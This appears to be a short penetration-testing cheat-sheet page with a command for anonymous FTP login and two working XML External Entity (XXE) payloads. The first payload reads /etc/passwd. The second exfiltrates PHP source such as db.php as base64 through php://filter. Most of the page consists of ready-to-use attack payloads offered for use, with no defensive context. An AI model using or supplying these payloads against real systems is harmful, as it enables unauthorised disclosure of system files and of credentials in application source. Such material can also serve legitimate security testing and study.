---
title: network
weight: 20
---

# ftp
----------------

login via ftp
```shell
ftp target-ip
```

anonymous login
```shell
username: anonymous
password: anonymous
```
----------------

# XML External Entity (XXE)
----------------

Read local files

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```

Read binary or files that otherwise can't be display (.php)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```
----------------
